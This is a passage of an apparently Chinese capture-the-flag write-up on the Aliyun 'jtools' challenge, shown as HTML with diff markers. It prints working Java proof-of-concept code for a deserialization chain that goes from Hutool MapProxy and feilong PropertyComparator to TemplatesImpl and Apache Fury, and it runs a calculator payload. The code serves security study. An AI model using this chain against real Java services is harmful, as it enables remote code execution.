+        <span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750910930801-f07096f5-614d-4b0a-b823-f6a257bb4509.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750988693900-a02b63a7-22f7-4cc7-9c72-27c50a406672.png"></p>
+<p>至此我们就可以去构造原生反序列化数据进去试一试</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">package com.app;
+
+import cn.hutool.core.map.MapProxy;
+import cn.hutool.core.util.ObjectUtil;
+import cn.hutool.db.dialect.Dialect;
+import com.Utils.Util;
+import com.feilong.core.util.comparator.PropertyComparator;
+
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.PriorityQueue;
+
+public class test &#123;
+    public static void main(String[] args) throws Exception &#123;
+
+        //二次反序列化数据
+        Object templates = Util.getTemplates(Util.getshortclass("open -a calculator"));
+        PropertyComparator beanComparator = new PropertyComparator("outputProperties");
+        PriorityQueue priorityQueue1 = new PriorityQueue(2,beanComparator);
+        Util.setValue(priorityQueue1,"size",2);
+        Object[] t = &#123;templates,templates&#125;;
+        Util.setValue(priorityQueue1,"queue",t);
+
+        byte[] decode = ObjectUtil.serialize(priorityQueue1);
+
+        //存入hashmap中
+        HashMap hashMap = new HashMap();
+        hashMap.put("wrapper",decode);
+        MapProxy mapProxy1 = new MapProxy(hashMap);
+
+        Dialect o = (Dialect)Proxy.newProxyInstance(Dialect.class.getClassLoader(), new Class[]&#123;Dialect.class&#125;, mapProxy1);
+        Dialect o1 =(Dialect) Proxy.newProxyInstance(Dialect.class.getClassLoader(), new Class[]&#123;Dialect.class&#125;, mapProxy1);
+
+
+//        //需要触发的getter
+        PropertyComparator propertyComparator = new PropertyComparator("wrapper");
+        PriorityQueue priorityQueue = new PriorityQueue(2,propertyComparator);
+
+        Util.setValue(priorityQueue,"size",2);
+        Object[] objectsjdk = &#123;o,o1&#125;;
+
+        Util.setValue(priorityQueue,"queue",objectsjdk);
+
+
+        String serialize = Util.serialize(priorityQueue);
+        Util.unserialize(serialize);
+    &#125;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>结果报错</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750993733185-314c4cd8-c33e-4534-905d-b9ae55eb0389.png"></p>
+<p>查阅相关资料</p>
+<p><a target="_blank" rel="noopener" href="https://godownio.github.io/2025/02/28/2025aliyun-ctf-java/">https://godownio.github.io/2025/02/28/2025aliyun-ctf-java/</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750993794881-3a864d20-af1f-4e97-a55d-45793f044ff9.png"></p>
+<p>大概意思就是，PropertyComparator和CB链中的BeanComparator有一些区别，会检查是否加载了spring下的工具类，如果存在spring相关，那么就会去调用spring的类去进行处理。否则会进入和cb链一样的处理流程。我这边用了自己的Util类，其中存在一些spring的依赖，导致发生了错误。</p>
+<p>修改payload即可</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">package com.app;
+
+import cn.hutool.core.map.MapProxy;
+import cn.hutool.core.util.ObjectUtil;
+import cn.hutool.db.dialect.Dialect;
+import com.feilong.core.util.comparator.PropertyComparator;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.fury.Fury;
+import org.apache.fury.config.Language;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.PriorityQueue;
+
+public class test &#123;
+    public static void main(String[] args) throws Exception &#123;
+
+        //二次反序列化数据
+        Object templates1 = getTemplates(Files.readAllBytes(Paths.get("/Users/Aecous/Documents/program/java/JavaUtils/target/classes/com/test/calc.class")));
+        Object templates2 = getTemplates(Files.readAllBytes(Paths.get("/Users/Aecous/Documents/program/java/JavaUtils/target/classes/com/test/calc.class")));
+
+        PropertyComparator beanComparator = new PropertyComparator("outputProperties");
+        PriorityQueue priorityQueue1 = new PriorityQueue(2,beanComparator);
+        setValue(priorityQueue1,"size",2);
+        Object[] t = &#123;templates1,templates2&#125;;
+        setValue(priorityQueue1,"queue",t);
+
+        byte[] decode = ObjectUtil.serialize(priorityQueue1);
+
+        //存入hashmap中
+        HashMap hashMap = new HashMap();
+        hashMap.put("wrapper",decode);
+        MapProxy mapProxy1 = new MapProxy(hashMap);
+
+        Dialect o = (Dialect)Proxy.newProxyInstance(Dialect.class.getClassLoader(), new Class[]&#123;Dialect.class&#125;, mapProxy1);
+        Dialect o1 =(Dialect) Proxy.newProxyInstance(Dialect.class.getClassLoader(), new Class[]&#123;Dialect.class&#125;, mapProxy1);
+
+
+//        //需要触发的getter
+        PropertyComparator propertyComparator = new PropertyComparator("wrapper");
+        PriorityQueue priorityQueue = new PriorityQueue(2,propertyComparator);
+
+        setValue(priorityQueue,"size",2);
+        Object[] objectsjdk = &#123;o,o1&#125;;
+
+        setValue(priorityQueue,"queue",objectsjdk);
+
+
+//        String serialize = serialize(priorityQueue);
+//        unserialize(serialize);
+
+        String poc = furyserialize(priorityQueue);
+        furyunserialize(poc);
+    &#125;
+
+    public static void furyunserialize(String data)&#123;
+        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
+        Object deserialize = fury.deserialize(Base64.getDecoder().decode(data));
+//        result = deserialize.toString();
+    &#125;
+
+    public static String furyserialize(Object data)&#123;
+        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
+        byte[] serialize = fury.serialize(data);
+        return Base64.getEncoder().encodeToString(serialize);
+    &#125;
+
+    public static void unserialize(String exp) throws IOException, ClassNotFoundException &#123;
+        byte[] bytes = Base64.getDecoder().decode(exp);
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        objectInputStream.readObject();
+    &#125;
+    public static Object getTemplates(byte[] bytes) throws Exception &#123;
+        Templates templates = new TemplatesImpl();
+        setValue(templates, "_bytecodes", new byte[][]&#123;bytes&#125;);
+        setValue(templates, "_name", "_");
+        setValue(templates, "_tfactory", new TransformerFactoryImpl());  //这里自己改呗
+        return templates;
+    &#125;
+
+    public static void setValue(Object obj, String name, Object value) throws Exception &#123;
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    &#125;
+
+    public static String serialize(Object obj) throws IOException &#123;
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(obj);
+        String poc = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+        return poc;
+    &#125;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750994541791-baf9a13c-cfeb-44a4-889c-16339c4b0145.png"></p>
+<p>最终只需要执行命令把结果输出到desc.txt中即可web访问了<img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1750994614626-175b0c5b-6721-4155-b3dd-31f726a017f1.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/05/24/%E4%B8%80%E5%9C%BA%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-06-29 01:36:26
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%B7%E6%89%8B%E5%BC%8F"><span class="toc-text">起手式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9F%A5%E6%89%BE"><span class="toc-text">利用链查找</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#feilong-%E4%BB%BB%E6%84%8F%E7%B1%BB%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-text">feilong 任意类构造函数调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hutool-mapproxy%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E6%AD%A3%E8%A7%A3%EF%BC%89"><span class="toc-text">Hutool mapproxy二次反序列化（正解）</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
+        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
+        placeholder: 'welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E9%98%BF%E9%87%8C%E4%BA%91jtools%E8%AF%A6%E8%A7%A3%E5%8F%8Acodeql%E5%88%86%E6%9E%90%E8%B0%83%E7%94%A8%E9%93%BE + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F06%2F29%2F%25E9%2598%25BF%25E9%2587%258C%25E4%25BA%2591jtools%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/06/29/%E9%98%BF%E9%87%8C%E4%BA%91jtools/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
